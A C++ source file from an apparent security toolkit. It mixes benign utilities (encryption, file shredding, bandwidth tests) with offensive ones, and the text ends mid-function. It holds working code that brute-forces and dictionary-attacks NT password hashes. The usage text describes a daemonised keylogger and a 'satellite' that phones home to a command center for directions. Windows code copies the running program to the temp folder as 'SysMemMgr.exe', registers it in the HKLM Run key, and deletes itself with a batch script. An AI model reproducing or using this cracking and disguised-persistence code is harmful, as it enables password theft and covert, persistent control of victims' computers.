// -------------------------------------------------------------
// The contents of this file may be distributed under the CC0
// license (http://creativecommons.org/publicdomain/zero/1.0/).
// Of course you may also distribute it under a more restrictive
// license, such as any of the OSI-approved licenses
// (http://www.opensource.org/licenses).
// -------------------------------------------------------------

#include "crawler.h"
#include <stdio.h>
#include <stdlib.h>
#include "../../GClasses/GHttp.h"
#include "../../GClasses/GApp.h"
#include "../../GClasses/GBits.h"
#include "../../GClasses/GDirList.h"
#include "../../GClasses/GDynamicPage.h"
#include "../../GClasses/GCrypto.h"
#include "../../GClasses/GError.h"
#include "../../GClasses/GHolders.h"
#include "../../GClasses/GRand.h"
#include "../../GClasses/GFile.h"
#include "../../GClasses/GThread.h"
#include "../../GClasses/GTime.h"
#include "../../GClasses/GSocket.h"
#include "GKeyboard.h"
#include <time.h>
#include <iostream>
#include <cmath>
#include <string>
#include <set>
#ifdef WINDOWS
#	include <direct.h>
#	include <process.h>
#	include <io.h> // for "filelength"
#	include "../../GClasses/GWindows.h"
#	include <stdlib.h>
#	include <TCHAR.h>
#else
#	include "md4.h" // for md4 hash
#endif
#include <exception>
#include <fstream>
#include "../../GClasses/usage.h"
#include "satellite.h"
#include <math.h>
#include <sstream>
#include <fstream>
#include <errno.h>
#include <memory>

using namespace GClasses;
using std::cout;
using std::cin;
using std::cerr;
using std::vector;
using std::string;
using std::set;
using std::ostringstream;
using std::ofstream;

#define MY_PORT 1234
#define KILO 1024
#define KBYTES 8192
#define MESSAGESIZE KILO * KBYTES
#define SMALL_MESSAGE_SIZE 8




UsageNode* makeCryptoUsageTree()
{
	UsageNode* pRoot = new UsageNode("waffles_security [command]", "Various security-related tools.");
	UsageNode* pBWC = pRoot->add("bandwidthclient <options>", "Run a client program for measuring bandwidth.");
	{
		UsageNode* pOpts = pBWC->add("<options>");
		pOpts->add("-addr [address]", "Specify the address of the bandwidth server (which should already be running). The default address is \"localhost\"");
		pOpts->add("-port [n]", "Specify the port to connect to. The default is 3712.");
	}
	UsageNode* pBWS = pRoot->add("bandwidthserver <options>", "Run a server program for measuring bandwidth.");
	{
		UsageNode* pOpts = pBWS->add("<options>");
		pOpts->add("-port [n]", "Specify the port on which to listen. The default is 3712.");
	}
	UsageNode* pBFNP = pRoot->add("bruteforcentpassword [hash] <options>", "Try all combinations of passwords until it finds one with an NT hash that matches [hash]. (This feature does not yet build on Windows because I used libssl to supply the MD4 algorithm, and I have not yet bothered to find a Windows version of the libssl library. It would not take much effort to get it working on Windows, I just have not done it yet. This feature could also be easily modified to do other types of hashes, but I have not yet done that either.)");
	{
		pBFNP->add("[hash]", "The NT hash of the password you wish to find. The hash should consist of 32 hexadecimal digits.");
		UsageNode* pOpts = pBFNP->add("<options>");
		pOpts->add("-charset [string]", "Add the specified string of characters to the character set. (These are the characters it will use to form password combinations.) You can use other flags in conjunction with this one to form a character set.");
		pOpts->add("-numbers", "Add the numerical digits to the character set. This is the same as doing -charset 0123456789");
		pOpts->add("-lowercase", "Add the lowercase letters to the character set. This is the same as doing -charset abcdefghijklmnopqrstuvwxyz");
		pOpts->add("-uppercase", "Add the uppercase letters to the character set. This is the same as doing -charset ABCDEFGHIJKLMNOPQRSTUVWXYZ");
		pOpts->add("-sym1", "Adds space, comma, period, underscore, hyphen, apostrophe, and question mark to the character set.");
		pOpts->add("-sym2", "Adds these symbols to the character set: !@#$%^&*+=");
		pOpts->add("-sym3", "Adds these symbols to the character set: ()<>[]{}|\\;:~`\"/");
		pOpts->add("-startlen [n]", "Specify the starting password length. That is, don't try any passwords smaller than [n] characters.");
		pOpts->add("-maxlen [n]", "Specify the maximum password length.");
		pOpts->add("-part [n]", "Start on the specified part of the possible combinations of passwords. [n] should be a number from 0 to c-1, where c is the number of characters in the character set.");
		pOpts->add("-onepartonly", "Only do one part, and then exit. This option is useful for doing it in parallel, such that each parallel process does a different part.");
		pOpts->add("-stoponcollision", "Terminate when the first collision is found.");
		pOpts->add("-noprogress", "Do not display progress percentage. (It might be preferable not to display progress, for example, if you are going to pipe the output to a file.)");
		pOpts->add("-include [substr]", "Specify a substring that is suspected to occur within the password. Each candidate password will be attempted with this substring insterted at every possible position. (This substring is not counted as part of the password length by the -startlen or -maxlen options.)");
	}
	{
		UsageNode* pCC = pRoot->add("commandcenter <options>", "Run an inter-active command-center program that enables you to direct your satellites.");
		UsageNode* pOpts = pCC->add("<options>");
		pOpts->add("-port [n]", "Specify the port to listen on. The default is 6831.");
	}
	{
		UsageNode* pDecrypt = pRoot->add("decrypt [filename]", "Decrypt the specified file. (It will prompt you to enter the passphrase.)");
		pDecrypt->add("[filename]", "The name of a file that was encrypted using the encrypt command.");
	}
	{
		pRoot->add("dump [filename] [offset] [length]", "Print the specified portion of a file.");
	}
	{
		pRoot->add("find [filename] [needle]", "Print all the offsets where [needle] occurs in the specified file. (This could be used, for example, with /dev/sda* to scan an entire hard drive, including deleted files. After you find what you want, it is typical to use \"dump\" to retrieve the region around it.)");
	}
	{
		UsageNode* pEncrypt = pRoot->add("encrypt [path] <options>", "Encrypt [path] to create a single encrypted archive file. (It will prompt you to enter a passphrase.)");
		pEncrypt->add("[path]", "A file name or a folder name. If it is a folder, then all of the contents recursively will be included.");
		UsageNode* pOpts = pEncrypt->add("<options>");
		pOpts->add("-out [filename]", "Specify the name of the output file. (The default is to use the name of the path with the extension changed to .encrypted.)");
		pOpts->add("-compress", "Take a lot longer, but produce a smaller encrypted archive file. (This feature really isn't very usable yet.)");
	}
	{
		UsageNode* pLogKeys = pRoot->add("logkeys [filename] <options>", "Log key-strokes to the specified file. (The program will exit if the panic-sequence \"xqwertx\" is detected.)");
		UsageNode* pOpts = pLogKeys->add("<options>");
		pOpts->add("-daemon", "Launch as a daemon. (Forks off a daemon that keeps running in the background and immediately exits.)");
	}
	pRoot->add("makegarbage", "Generates a bunch of 2GB files named garb#.tmp full of random garbage. It will keep generating them until you stop the program, or it crashes (perhaps due to the hard drive being full). The purpose of this tool is to fill the available areas of your hard drive so that previously deleted files will be more difficult to recover. When it is done, you can delete all the garb#.tmp files. This might also be useful for wiping a hard drive prior to discarding it.");
	pRoot->add("nthash [password]", "Computes the NT hash of [password]. (This feature does not yet build on Windows because I used libssl to supply the MD4 algorithm, and I have not yet bothered to find a Windows version of the libssl library. It would not take much effort to get it working on Windows, I just have not done it yet.)");
	pRoot->add("open [filename]", "A convenient interactive version of decrypt that prompts you to shred the files after you are done with them.");
	pRoot->add("grep [filename] [needle]", "Decrypt [filename], print every line containing [needle], then shred the decrypted files.");
	{
		UsageNode* pSatellite = pRoot->add("satellite <options>", "Run a satellite program that periodically phones home to receive directions.");
		UsageNode* pOpts = pSatellite->add("<options>");
		pOpts->add("-connectinterval [seconds]", "Specify the time in seconds between attempts to phone home. The default is 600 seconds");
		pOpts->add("-addr [address]", "Specify the address to phone home to. The default is 'localhost', which is only useful for testing purposes.");
		pOpts->add("-port [n]", "Specify the port to phone home to. The default is 6831.");
	}
	pRoot->add("shred [path]", "Writes over the file or folder (and its contents recursively) ONE time with random garbage, and then deletes it. On some file systems, this makes it very difficult to recover the file or folder. Please be aware that some filesystems (like those used on flash drives) write new data to a different location, so this will do no good (see the makegarbage tool). Also, forensic experts can often recover files that have been overwritten a small number of times. If you want your files to be truly unrecoverable, you need to use a more heavy-duty shredder.");
	pRoot->add("usage", "See the full usage information for this tool.");
	pRoot->add("wget [url] [filename]", "Download the file at [url] and save it to [filename].");
	return pRoot;
}

bool shredFile(const char* szFilename)
{
#ifdef WINDOWS
	char szTmp[4096];
	int i;
	for(i = 0; i < 4096; i++)
		szTmp[i] = rand() % 256;
	FILE* pFile = fopen(szFilename, "r+");
	if(!pFile)
		return false;
	FileHolder hFile(pFile);
	int nFileSize = filelength(fileno(pFile));
	while(nFileSize > 0)
	{
		fwrite(szTmp, 1, 4096, pFile);
		nFileSize -= 4096;
	}
	fflush(pFile);
	hFile.release();
	return DeleteFile(szFilename) ? true : false;
#else
	GTEMPBUF(char, szTmp, strlen(szFilename) + 32);
#	ifdef DARWIN
	strcpy(szTmp, "srm -s ");
#	else
	strcpy(szTmp, "shred -fun1 ");
#	endif
	strcat(szTmp, szFilename);
	bool bOK = (system(szTmp) == 0);
	return bOK;
#endif
}

bool shredFolder(const char* szPath)
{
	char* szOldDir = new char[300]; // use heap so deep recursion won't overflow stack
	std::unique_ptr<char[]> hOldDir(szOldDir);
	if(!getcwd(szOldDir, 300))
		throw Ex("Failed to read current dir");

	// Recurse subdirs
	bool bOK = true;
	{
		if(chdir(szPath) != 0)
			return false;
		vector<string> folders;
		GFile::folderList(folders);
		for(vector<string>::iterator it = folders.begin(); it != folders.end(); it++)
		{
			const char* szDir = it->c_str();
			if(!shredFolder(szDir))
				bOK = false;
		}
	}

	// Delete files
	{
		vector<string> files;
		GFile::fileList(files);
		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
		{
			const char* szFile = it->c_str();
			if(!shredFile(szFile))
				bOK = false;
		}
	}

	if(chdir(szOldDir) != 0)
		throw Ex("Failed to restore the old dir");

	// todo: we should rename the directory before we delete it

#ifdef WINDOWS
	RemoveDirectory(szPath);
#else
	rmdir(szPath);
#endif
	return bOK;
}

void shred(const char* szPath)
{
	if(access(szPath, 0 ) != 0)
		throw Ex("The file or folder ", szPath, " does not seem to exist");
	struct stat status;
	stat(szPath, &status);
	if(status.st_mode & S_IFDIR)
		shredFolder(szPath);
	else
	{
		shredFile(szPath);

		// Also shred the temporary backup copy that many text editors make
		string s = szPath;
		s += "~";
		if(access(s.c_str(), 0) == 0)
			shredFile(s.c_str());
	}
}

void shred(GArgReader& args)
{
	shred(args.pop_string());
}

void makeGarbage(GArgReader& args)
{
	char buf[2048];
	unsigned long long* pBuf2 = (unsigned long long*)buf;
	size_t n = 0;
	while(true)
	{
		GRand prng(getpid() * time(NULL));
		ostringstream oss;
		oss << "garb";
		oss << n;
		oss << ".tmp";
		string sFilename = oss.str();
		ofstream ofs(sFilename.c_str());
		for(size_t i = 0; i < 1024 * 1024; i++)
		{
			unsigned long long* pTmp = pBuf2;
			for(size_t j = 0; j < 256; j++)
				*pTmp++ = prng.next();
			ofs.write(buf, 2048);
		}
		n++;
	}
}

#ifdef WINDOWS
HKEY GetRunKey()
{
	HKEY hSoftware;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE", 0, KEY_ALL_ACCESS, &hSoftware) != ERROR_SUCCESS)
		throw Ex("Failed to open SOFTWARE registry key");
	HKEY hMicrosoft;
	if(RegOpenKeyEx(hSoftware, "Microsoft", 0, KEY_ALL_ACCESS, &hMicrosoft) != ERROR_SUCCESS)
		throw Ex("Failed to open Microsoft registry key");
	HKEY hWindows;
	if(RegOpenKeyEx(hMicrosoft, "Windows", 0, KEY_ALL_ACCESS, &hWindows) != ERROR_SUCCESS)
		throw Ex("Failed to open Windows registry key");
	HKEY hCurrentVersion;
	if(RegOpenKeyEx(hWindows, "CurrentVersion", 0, KEY_ALL_ACCESS, &hCurrentVersion) != ERROR_SUCCESS)
		throw Ex("Failed to open CurrentVersion registry key");
	HKEY hRun;
	if(RegOpenKeyEx(hCurrentVersion, "Run", 0, KEY_ALL_ACCESS, &hRun) != ERROR_SUCCESS)
		throw Ex("Failed to open Run registry key");

	return hRun;
}

void InstallInRunFolder(const char* szName, const char* szPath)
{
	if(RegSetValueEx(GetRunKey(), szName, 0, REG_SZ, (const unsigned char*)szPath, strlen(szPath) + 1) != ERROR_SUCCESS)
		throw Ex("Failed to set registry value");
}

void RemoveFromRunFolder(const char* szName)
{
	if(RegDeleteValue(GetRunKey(), szName) != ERROR_SUCCESS)
		throw Ex("Failed to set registry value");
}

void InstallOnWindowsAndLaunch()
{
	// Get the current filename
	char szAppPath[512];
	GetModuleFileName(NULL, szAppPath, 512);

	// Get a new filename
	char newPath[512];
	GetTempPath(512, newPath);
	newPath[256] = '\0';
	int len = strlen(newPath);
	if(len > 0 && newPath[len - 1] != '\\' && newPath[len - 1] != '/')
	{
		strcpy(newPath + len, "/");
		len++;
	}
	strcpy(newPath + len, "SysMemMgr.exe");

	// Copy the file
	if(GFile::doesFileExist(newPath))
	{
		if(!DeleteFile(newPath))
			exit(0);
	}
	if(!GFile::copyFile(szAppPath, newPath))
		cout << "The application failed to start\n";

	// Install in the registry
	strcat(newPath + len, " q9f24m3");
	InstallInRunFolder("SysMemMgr", newPath);
	GApp::systemExecute(newPath, false, NULL, NULL);
	GThread::sleep(900);
	exit(0);
}


void UninstallFromWindows()
{
	// Remove from registry
	RemoveFromRunFolder("SysMemMgr");

	// Create a self-destruct batch file
	char szAppPath[512];
	GetModuleFileName(NULL, szAppPath, 512);
	int j = -1;
	int i;
	for(i = 0; szAppPath[i] != '\0'; i++)
	{
		if(szAppPath[i] == '/' || szAppPath[i] == '\\')
			j = i;
	}
	if(j > -1)
	{
		szAppPath[j + 1] = '\0';
		chdir(szAppPath);
		strcpy(szAppPath + j + 1, "sd.bat");
		FILE* pFile = fopen(szAppPath, "w");
		fputs("@ping 127.0.0.1 -n 3 -w 1000 > nul\n", pFile); // wait six seconds
		fputs("@del /f /q %1% > nul\n", pFile); // delete the specified file
		fputs("@del /f /q %0% > nul\n", pFile); // delete itself
		fclose(pFile);

		// Run the batch file
		strcat(szAppPath + j, " SysMemMgr.exe");
		GApp::systemCall(szAppPath, false, false);
	}
	else
	{
	}

	exit(0);
}
#else

#endif // !WINDOWS

int doBandwidthClient(GArgReader& args)
{
	int port = 3712;
	const char* szUrl = "localhost";
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else if(args.if_pop("-addr"))
			szUrl = args.pop_string();
		else
			throw Ex("Invalid option: ", args.peek());
	}

	// Fill an 8-MB buffer with random data
	unsigned char* pBuf = new unsigned char[MESSAGESIZE];
	std::unique_ptr<unsigned char[]> hBuf(pBuf);
	GRand r(0);
	unsigned int* pU = (unsigned int*)pBuf;
	for(unsigned int i = 0; i < MESSAGESIZE / sizeof(unsigned int); i++)
		*(pU++) = (unsigned int)r.next();

	// Make a ClientSocket
	cout << "Connecting to server...\n";
	GPackageClient socket;
	double dStart = GTime::seconds();
	socket.connect(szUrl, port);
	double dFinish = GTime::seconds();
	cout << "Connecting time = " << dFinish - dStart << "\n";

	// Measure latency
	cout << "Measuring latency...\n";
	double dLatency = 0;
	for(int i = 0; i < 9; i++)
	{
		// Send a small message
		dStart = GTime::seconds();
		socket.send((const char*)pBuf, SMALL_MESSAGE_SIZE);

		// Wait for a reply
		cout << "Waiting for the reply...\n";
		char* pMessage;
		size_t nSize;
		while(true)
		{
			pMessage = socket.receive(&nSize);
			if(pMessage)
				break;
#ifdef WINDOWS
			GWindows::yield();
#endif
			GThread::sleep(0);
		}
		dFinish = GTime::seconds();
		if(i > 0)
			dLatency += (dFinish - dStart);
	}
	dLatency /= 16;
	cout << "Latency: " << dLatency << "\n";

	// Send a big message
	cout << "Sending an 8MB message (to measure bandwidth)...\n";
	dStart = GTime::seconds();
	socket.send((const char*)pBuf, MESSAGESIZE);

	// Wait for a reply
	cout << "Waiting for the server to send it back...\n";
	char* pMessage;
	size_t nSize;
	while(true)
	{
		pMessage = socket.receive(&nSize);
		if(pMessage)
			break;
#ifdef WINDOWS
		GWindows::yield();
#endif
		GThread::sleep(0);
	}
	dFinish = GTime::seconds();

	// Check the message
	if(nSize != MESSAGESIZE)
		throw Ex("The reply is the wrong size--something's wrong\n");
	if(memcmp(pMessage, pBuf, MESSAGESIZE))
		cout << "!!!The message differs from the original--something's wrong!!!\n";

	cout << "Roundtrip time: " << dFinish - dStart << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 8 * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / 1000000 << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / 1000000 << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / (1024 * 1024) << "\n";
	return 0;
}

int doBandwidthServer(GArgReader& args)
{
	// Parse args
	int port = 3712;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			throw Ex("Invalid option: ", args.peek());
	}

	// Repeat messages
	GPackageServer socket(port);
	cout << "waiting for a client program to connect...\n";
	while(true)
	{
		size_t nSize;
		GPackageConnection* pConn;
		char* pMessage = socket.receive(&nSize, &pConn);
		if(pMessage)
		{
			// Get the message
			cout << "Got a message.  Sending it back...\n";
			socket.send((const char*)pMessage, nSize, pConn);
			cout << "Message sent.\n";
			cout << "Waiting for another client to connect...\n";
		}

                // Let Windows have a chance to pump messages through
#ifdef WINDOWS
		GWindows::yield();
		Sleep(0);
#endif
	}
	return 0;
}



void nthash(const char* password, unsigned char* hash)
{
#ifdef WINDOWS
	throw Ex("Sorry, this feature is not yet implemented for Windows. (It works on Linux.)");
#else
	unsigned short buf[128];
	unsigned int len = 0;
	for(unsigned short* pBuf = buf ; *password != '\0'; password++)
	{
		*pBuf = htons((unsigned int)*password << 8);
		pBuf++;
		len++;
	}
	md4 ctx;
	md4_init(&ctx);
	md4_update(&ctx, buf, len * sizeof(unsigned short));
	md4_finito(&ctx, hash);
#endif
}

void dictionaryAttackNTPassword(unsigned char* hash, vector<vector<string>* >& dictionaries, string& separator, bool stopOnCollision)
{
	unsigned char candHash[16];
	char buf[256];
	GTEMPBUF(size_t, indexes, dictionaries.size());
	size_t total = 1;
	for(size_t i = 0; i < dictionaries.size(); i++)
	{
		indexes[i] = 0;
		total *= dictionaries[i]->size();
	}
	size_t cur = 0;
	while(true)
	{
		// Add the first word
		vector<string>& dict = *dictionaries[0];
		string& w1 = dict[indexes[0]];
		memcpy(buf, w1.c_str(), w1.length());
		size_t pos = w1.length();

		// Add more words
		for(size_t i = 1; i < dictionaries.size(); i++)
		{
			// Add the separator
			memcpy(buf + pos, separator.c_str(), separator.length());
			pos += separator.length();

			// Add the next word
			vector<string>& dict2 = *dictionaries[i];
			string& word = dict2[indexes[i]];
			memcpy(buf + pos, word.c_str(), word.length());
			pos += word.length();
		}

		// Test it
		buf[pos] = '\0';
		nthash(buf, candHash);
		if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
		{
			cout << "\r                        \rFound a collision: " << buf << "\n";
			cout.flush();
			if(stopOnCollision)
				return;
		}
//cout << buf << "\n";

		// Increment the indexes
		for(size_t i = 0; true; i++)
		{
			if(++indexes[i] >= dictionaries[i]->size())
			{
				if(i + 1 == dictionaries.size())
					return;
				indexes[i] = 0;
			}
			else
				break;
		}

		// Display progress
		if(cur++ % 100000 == 0)
		{
			cout << ((double)(cur * 100) / total) << "          \r";
		}
	}
}

const char* g_trigrams = // 320 common trigrams
"theandingionentforatiterhastioateersresthaheresttiscomproeresthallmenncendeintoftyouedtonsourcon"
"areveressthireastatinhatistectortearineagehistedontstoithntesintororeliniveitewitnotnthtraomeica"
"perartcatctisteofticeoutothideillethiesoneserstrecoerauseuresanevedinratonacesediitierirannality"
"ounrinameactighesestiaventshesturastntasitderfthlesmanpriantnewreeostbleporghtindancchaeasparove"
"romtesrecsonertlanaincalcanormworsofendheainalicshoberhanmattathinnesprentiardcouredrenticeineme"
"ricustfrorthinceataseleandiinstanssininminailrchompellervplapleealtalencasstthlleelemoreantemsea"
"rmaalsrieemaalindaackhenialordanaundarcgramesorichethoeofntoommposabllatndslisdiseencarngtireead"
"etoeneinfmernfohavattheckinesavieotedthdatliternsioonoesimarchitenuniimenatdeshoutotanytriretfin"
"rittimdenscoanshelnstrepesospeducntrrtimbeunttteusitivneroushemensaledayngstreralnitoraroungewil"
"ileopefrewasinihartoflasmontonorsveneliuctshiaboooksedownaniditeviangaryondracappisisenissorktel";

void bruteForceNTPassword(size_t passwordLen, unsigned char* hash, const char* charSet, size_t part, bool onePartOnly, bool stopOnCollision, bool showProgress, const char* szInclude)
{
	unsigned char candHash[16];
	if(passwordLen == 0)
	{
		nthash("", candHash);
		if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
		{
			cout << "\r                        \rFound a collision: <empty password>\n";
			cout.flush();
		}
		return;
	}
	cout.precision(8);
	size_t includeLen = 0;
	if(szInclude)
		includeLen = strlen(szInclude);
	GTEMPBUF(const char*, pChars, passwordLen); // A buffer of pointers. Each element points at the current char in that position.
	GTEMPBUF(char, cand, passwordLen + includeLen + 1); // The candidate passphrase.
	cand[passwordLen + includeLen] = '\0';
	for(size_t i = 0; i < passwordLen; i++)
	{
		pChars[i] = charSet;
		cand[i] = *pChars[i];
	}
	size_t charSetLen = strlen(charSet);
	size_t termLen = passwordLen - 1;
	if(part >= charSetLen)
		throw Ex("Part ", to_str(part), " is out of range. It should be from 0 to ", to_str(charSetLen - 1));
	pChars[passwordLen - 1] += part;
	cand[passwordLen - 1] = *pChars[passwordLen - 1];
	if(termLen > 0 && onePartOnly)
		termLen--; // only do one part
	size_t n = 1;
	while(true)
	{
		// Try the candidate password
		if(szInclude)
		{
			// Shift the candidate passphrase
			memmove(cand + includeLen, cand, passwordLen);
			memcpy(cand, szInclude, includeLen);
			nthash(cand, candHash);
			if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
			{
				cout << "\r                        \rFound a collision: " << cand << "\n";
				cout.flush();
				if(stopOnCollision)
					return;
			}
			for(size_t i = 0; i < passwordLen; i++)
			{
				cand[i] = cand[i + includeLen];
				memcpy(cand + i + 1, szInclude, includeLen);
				nthash(cand, candHash);
				if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
				{
					cout << "\r                        \rFound a collision: " << cand << "\n";
					cout.flush();
					if(stopOnCollision)
						return;
				}
			}
		}
		else
		{
			nthash(cand, candHash);
			if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
			{
				cout << "\r                        \rFound a collision: " << cand << "\n";
				cout.flush();
				if(stopOnCollision)
					return;
			}
		}

		// Advance
		for(size_t i = 0; i < passwordLen; i++)
		{
			pChars[i]++;
			cand[i] = *pChars[i];
			if(*pChars[i] == '\0')
			{
				pChars[i] = charSet;
				cand[i] = *charSet;
				if(i == termLen)
				{
					cout << "\r                        \r";
					return; // All done
				}
			}
			else
				break;
		}
		// Display progress
		if(showProgress && --n == 0)
		{
			n = 2000000; // how frequently to display progress
			size_t den = charSetLen;
			size_t num = 0;
			for(size_t i = termLen; i < passwordLen; i--)
			{
				num += (pChars[i] - charSet);
				if(den >= 10000000) // don't overrun the precision of our registers
					break;
				den *= charSetLen;
				num *= charSetLen;
			}
			double prog = (double)num * 100 / den; // convert to a percentage
			cout << "\r                                    \r" << prog << "% (part " << (pChars[passwordLen - 1] - charSet) << "/" << charSetLen << ")";
			cout.flush();
		}
	}
}

void bruteForceNTPassword(GArgReader& args)
{
	const char* szHashHex = args.pop_string();
	if(strlen(szHashHex) != 32)
		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
	unsigned char hash[16];
	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
	string charset = "";
	string include = "";
	size_t startLen = 0;
	size_t maxLen = 1000000;
	size_t part = 0;
	bool onePartOnly = false;
	bool stopOnCollision = false;
	bool showProgress = true;
	while(args.next_is_flag())
	{
		if(args.if_pop("-charset"))
			charset += args.pop_string();
		else if(args.if_pop("-numbers"))
			charset += "0123456789";
		else if(args.if_pop("-lowercase"))
			charset += " abcdefghijklmnopqrstuvwxyz";
		else if(args.if_pop("-uppercase"))
			charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		else if(args.if_pop("-sym1"))
			charset += ",._-'?";
		else if(args.if_pop("-sym2"))
			charset += "+=!@#$%^&*";
		else if(args.if_pop("-sym3"))
			charset += "()<>[]{}|\\;:~`\"/";
		else if(args.if_pop("-startlen"))
			startLen = args.pop_uint();
		else if(args.if_pop("-maxlen"))
			maxLen = args.pop_uint();
		else if(args.if_pop("-part"))
			part = args.pop_uint();
		else if(args.if_pop("-onepartonly"))
			onePartOnly = true;
		else if(args.if_pop("-stoponcollision"))
			stopOnCollision = true;
		else if(args.if_pop("-noprogress"))
			showProgress = false;
		else if(args.if_pop("-include"))
			include = args.pop_string();
		else
			throw Ex("Invalid option: ", args.peek());
	}

	// Remove dupes
	{
		set<char> cs;
		for(size_t i = charset.length() - 1; i < charset.length(); i--)
		{
			if(cs.find(charset[i]) == cs.end())
				cs.insert(charset[i]);
			else
				charset.erase(i);
		}
	}
	if(charset.length() == 0)
		charset += "abcdefghijklmnopqrstuvwxyz 0123456789";

	cout << "Character set: " << charset << "\n";
	if(onePartOnly)
		bruteForceNTPassword(startLen, hash, charset.c_str(), part, onePartOnly, stopOnCollision, showProgress, include.length() > 0 ? include.c_str() : NULL);
	else
	{
		for(size_t len = startLen; len <= maxLen; len++)
		{
			cout << "Trying passwords of length " << len << ":\n";
			cout.flush();
			bruteForceNTPassword(len, hash, charset.c_str(), part, onePartOnly, stopOnCollision, showProgress, include.length() > 0 ? include.c_str() : NULL);
		}
	}
}

void dictAttack(unsigned char* hash, vector<string>* pd1, vector<string>* pd2 = NULL, vector<string>* pd3 = NULL)
{
	vector< vector<string>* > dictionaries;
	dictionaries.push_back(pd1);
	if(pd2)
		dictionaries.push_back(pd2);
	if(pd3)
		dictionaries.push_back(pd3);
	string s1 = "";
	dictionaryAttackNTPassword(hash, dictionaries, s1, false);
	string s2 = " ";
	if(pd2)
		dictionaryAttackNTPassword(hash, dictionaries, s2, false);
}

void dictAttackNTPassword(GArgReader& args)
{
	const char* szHashHex = args.pop_string();
	if(strlen(szHashHex) != 32)
		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
	unsigned char hash[16];
	GBits::hexToBufferBigEndian(szHashHex, 32, hash);

	const char* szDictionary = args.pop_string();
	size_t cap1 = 6;
	size_t cap2 = 4;
	size_t cap3 = 3;
	while(args.next_is_flag())
	{
		if(args.if_pop("-cap1"))
			cap1 = args.pop_uint();
		else if(args.if_pop("-cap2"))
			cap2 = args.pop_uint();
		else if(args.if_pop("-cap3"))
			cap3 = args.pop_uint();
		else
			throw Ex("Invalid option: ", args.peek());
	}

	std::ifstream fs;
	try
	{
		fs.open(szDictionary, std::ios::binary);
	}
	catch(const std::exception&)
	{
		if(GFile::doesFileExist(szDictionary))
			throw Ex("Error while trying to open the existing file: ", szDictionary);
		else
			throw Ex("File not found: ", szDictionary);
	}
	vector<string> d1;
	vector<string> d2;
	vector<string> d3;
	while(!fs.eof())
	{
		string s;
		std::getline(fs, s);
		if(s.length() <= cap1)
			d1.push_back(s);
		if(s.length() <= cap2)
			d2.push_back(s);
		if(s.length() <= cap3)
			d3.push_back(s);
	}
	//cout << to_str(d1.size()) << "\n" << to_str(d2.size()) << "\n" << to_str(d3.size()) << "\n";

	cout << "Trying one-word passphrases...\n";
	dictAttack(hash, &d1);
	cout << "Trying two-word passphrases...\n";
	dictAttack(hash, &d1, &d2);
	if(d1.size() != d2.size())
		dictAttack(hash, &d2, &d1);
	cout << "Trying three-word passphrases...\n";
	dictAttack(hash, &d1, &d2, &d3);
	if(d2.size() != d3.size())
	{
		dictAttack(hash, &d1, &d3, &d2);
		if(d1.size() != d2.size())
		{
			dictAttack(hash, &d2, &d1, &d3);
			dictAttack(hash, &d2, &d3, &d1);
			dictAttack(hash, &d3, &d2, &d1);
			dictAttack(hash, &d3, &d1, &d2);
		}
	}
}

void dump(GArgReader& args)
{
	const char* szFilename = args.pop_string();
	size_t startPos = args.pop_uint();
	size_t length = args.pop_uint();

	size_t fileSize;
	std::ifstream ifs;
	ifs.exceptions(std::ios::failbit|std::ios::badbit);
	try
	{
		ifs.open(szFilename, std::ios::binary);
		ifs.seekg(0, std::ios::end);
		fileSize = (size_t)ifs.tellg();
		ifs.seekg(startPos, std::ios::beg);
	}
	catch(const std::exception&)
	{
		throw Ex("Error while trying to open the file, ", szFilename, ". ", strerror(errno));
	}

	length = std::min(length, fileSize - startPos);
	if(startPos >= fileSize)
		length = 0;
	size_t bufSize = std::min((size_t)8192, length);
	char* pBuf = new char[bufSize + 1];
	std::unique_ptr<char[]> hBuf(pBuf);
	while(length > 0)
	{
		size_t blockLen = std::min(length, bufSize);
		ifs.read(pBuf, blockLen);
		char* pB = pBuf;
		for(size_t i = 0; i < blockLen; i++)
		{
			if(*pB < ' ' && *pB != '\n')
				*pB = '~';
			else if(*pB > '~')
				*pB = '~';
			pB++;
		}
		pBuf[blockLen] = '\0';
		cout << pBuf;
		length -= blockLen;
	}
}

#define MAX_PASSPHRASE_LEN 1024
#define SALT_LEN 32

/// Assumes salt of length SALT_LEN has already been concatenated to passphrase
void encryptPath(const char* pathName, char* passphrase, const char* targetName, bool compress)
{
	// Encrypt the path
	GFolderSerializer fs(pathName, compress);
	GCrypto crypto(passphrase, strlen(passphrase));
	std::ofstream ofs;
	ofs.exceptions(std::ios::failbit|std::ios::badbit);
	ofs.open(targetName, std::ios::binary);

	// Write the salt
	ofs.write(passphrase + strlen(passphrase) - SALT_LEN, SALT_LEN);

	size_t prevProg = 0;
	while(true)
	{
		size_t len;
		char* chunk = fs.next(&len);
		if(!chunk)
			break;
		crypto.doChunk(chunk, len);
		try
		{
			ofs.write(chunk, len);
			size_t prog = fs.bytesOut();
			if(prog >= prevProg + 100000)
			{
				cout << "          \r" << 0.01 * floor((float)prog * 0.0001) << "MB";
				cout.flush();
			}
		}
		catch(const std::exception&)
		{
			throw Ex("Error writing to file ", targetName);
		}
	}
	cout << "\rDone.               \n";
}

void appendSalt(char* passphrase, const char* salt)
{
	size_t len = strlen(passphrase);
	size_t sl = std::min((unsigned int)(MAX_PASSPHRASE_LEN - 1 - len), (unsigned int)SALT_LEN);
	memcpy(passphrase + len, salt, sl);
